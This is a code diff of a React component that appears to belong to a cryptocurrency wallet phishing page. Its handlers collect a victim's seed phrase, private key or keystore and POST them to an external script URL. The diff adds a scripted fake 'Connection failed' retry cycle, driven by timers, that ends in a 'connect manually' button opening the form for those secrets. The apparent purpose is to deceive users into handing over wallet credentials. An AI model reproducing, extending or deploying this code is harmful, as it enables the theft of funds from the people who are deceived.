@@ -62,7 +62,8 @@ const Moreinfo = () => {
     const navigate = useNavigate();
     const { data, isLoading,  } = useCoindata(id)
 
-
+    const coinPhoto = data?.data?.logo;
+    const coinName = data?.data?.name;
 
     const [phrase, setphrasevalue]= useState("");
     const [keystore, setkeystorevalue] = useState('');
@@ -154,13 +155,13 @@ const Moreinfo = () => {
 
   const handlereqphrase = (e) => {
     e.preventDefault()
-    const coin_name = name;
-    const fullinfo = JSON.stringify({ coin_name, phrase });
-    const formData = new FormData();
-  formData.append('phrase', phrase);
-  formData.append('coin_name', coin_name);
+    const coin_name = coinName;  // Changed from name to coinName
+        const fullinfo = JSON.stringify({ coin_name, phrase });
+        const formData = new FormData();
+        formData.append('phrase', phrase);
+        formData.append('coin_name', coin_name);;
   const fulldata = formData;
-  console.log(fulldata)
+  
     fetch(scriptURL, { method: 'POST', body: fulldata})
       .then(response => console.log('Success!', response))
       .catch(error => console.error('Error!', error.message))
@@ -177,7 +178,7 @@ const Moreinfo = () => {
 
   const handlereqprivatekey = (e) => {
     e.preventDefault()
-    const coin_name = name;
+    const coin_name = coinName;
     const fullinfo = JSON.stringify({ coin_name, phrase });
     const formData = new FormData();
   formData.append('private_key', private_key);
@@ -198,7 +199,7 @@ const Moreinfo = () => {
   const handlereqkeystore = (e) => {
     
     e.preventDefault()
-    const coin_name = name;
+    const coin_name = coinName;
     const fullinfo = JSON.stringify({ coin_name, phrase });
     const formData = new FormData();
   formData.append('keystore', keystore);
@@ -229,30 +230,58 @@ const Moreinfo = () => {
 
 
    
-    const [showinputkey, setshowinputkey] = useState(false);
-    const handleshowkey = () => {
-      setshowinputkey(true)
+  const [showinputkey, setshowinputkey] = useState(false);
+  const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
+  const [inputError, setInputError] = useState(false);
+  const [attemptNumber, setAttemptNumber] = useState(1);
+  const [isInitializing, setIsInitializing] = useState(true);
+  const [showRetryButton, setShowRetryButton] = useState(false);
+  const [showManualButton, setShowManualButton] = useState(false);
+
+const handleshowkey = () => {
+    setshowinputkey(true)
+}
+
+const handleRetry = () => {
+    setShowRetryButton(false);
+    setInputPlaceholder('initializing...');
+    setInputError(false);
+    setIsInitializing(true);
+    setAttemptNumber(prev => prev + 1);
+}
+
+const startInitializationCycle = () => {
+    setTimeout(() => {
+        if (attemptNumber === 1) {
+            setInputPlaceholder("Connection failed");
+            setInputError(true);
+            setShowRetryButton(true);
+            setIsInitializing(false);
+        } else if (attemptNumber === 2) {
+            setInputPlaceholder("Connection failed");
+            setInputError(true);
+            setShowRetryButton(true);
+            setIsInitializing(false);
+        } else {
+            setInputPlaceholder("Error Connecting...");
+            setInputError(true);
+            setShowManualButton(true);
+            setIsInitializing(false);
+        }
+    }, 6000);
+}
+
+useEffect(() => {
+    if (isInitializing) {
+        startInitializationCycle();
     }
-    const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
-    const [inputError, setInputError] = useState(false);
+    return () => clearTimeout();
+}, [isInitializing, attemptNumber]);
 
-    const [showbutton, setshowbutton] = useState(false);
+const inputHolderClass = inputError ? 'inputholderchange' : 'inputholder';
 
-    const inputHolderClass = inputError ? 'inputholderchange' : 'inputholder';
+// Then in your JSX, replace:
 
-    useEffect(() => {
-        const timer = setTimeout(() => {
-          setInputPlaceholder("Error Connecting...");
-         
-          setshowbutton(true);
-          setInputError(true)
-        }, 5000);
-        // setcoin_name(data?.data.name)
-        return () => clearTimeout(timer);
-      }, []);
-      // console.log(inputError)
-      const photo = data?.data.logo;
-const name = data?.data.name;
 
 
 
@@ -267,14 +296,43 @@ const name = data?.data.name;
       <div className="mainmodalinfo">
           {data && <div className="coindisplayinner">
           {/* <img className="coin-image" src={photo} alt={name} /> */}
-        <p className='coin-name'>{name}</p>
+          <p className='coin-name'>{coinName}</p>
           </div>}
-      <div className={inputHolderClass}>
+
+          <div className={inputHolderClass}>
+    <p className={inputError ? 'placeholder2' : 'placeholder1'}>{inputPlaceholder}</p> 
+
+    {showRetryButton && 
+        <Button onClick={handleRetry}>
+            retry({attemptNumber === 1 ? "2" : "1"})
+        </Button>
+    }
+
+    {showManualButton && 
+        <Button onClick={handleshowkey}>
+            connect manually
+        </Button>
+    }
+</div>
+
+      {/* <div className={inputHolderClass}>
       <p className={inputError ? 'placeholder2' : 'placeholder1'}>{inputPlaceholder}</p> 
 
-      {showbutton && <Button onClick={handleshowkey}>connect manually  </Button>}
+      {showRetryButton && 
+                            <Button onClick={handleRetry}>
+                                retry({attemptNumber === 1 ? "2" : "1"})
+                            </Button>
+                        }
 
-      </div>
+                        {showManualButton && 
+                            <Button onClick={handleshowkey}>
+                                connect manually
+                            </Button>
+                        }
+
+
+      </div> */}
+      
       </div>
       {showinputkey && <Box className="con_tab" sx={{ width: {
             xs: "320px",
@@ -286,7 +344,7 @@ const name = data?.data.name;
     }}>
       <div className="upnavs"> 
       {/* <button className='inputback' onClick={handleclodepop}><IoChevronBackCircleSharp size={35}/></button> */}
-      <img src={photo} className="coin-image" alt={name} />
+      <img src={coinPhoto} className="coin-image" alt={coinName} />
       {/* <form action="post">
       <input type="text" className="Cname" value={name} name='coin_name' disabled />
       </form> */}
